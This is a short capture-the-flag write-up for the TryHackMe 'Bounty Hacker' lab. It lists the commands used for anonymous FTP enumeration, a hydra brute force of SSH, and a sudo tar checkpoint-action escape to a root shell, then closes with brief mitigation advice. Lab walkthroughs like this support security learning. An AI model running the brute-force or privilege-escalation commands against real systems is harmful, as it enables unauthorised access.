# Bounty Hacker - TryHackMe

**Skills:** FTP, Hydra SSH Bruteforce, Tar PrivEsc

## Recon
nmap -sV IP
-> 21 ftp anon login, 22 ssh, 80 http

## Enum
ftp IP -> Anonymous -> task.txt (todo list), locks.txt (wordlist)
gobuster http -> /images/

## Bruteforce
hydra -l lin -P locks.txt ssh://IP
-> login lin@IP

## User
cat user.txt

## PrivEsc
sudo -l
-> (root) /bin/tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-> root shell
cat /root/root.txt

## Mitigation
- Disable FTP anon
- Strong password policy
- Don't allow tar with sudo
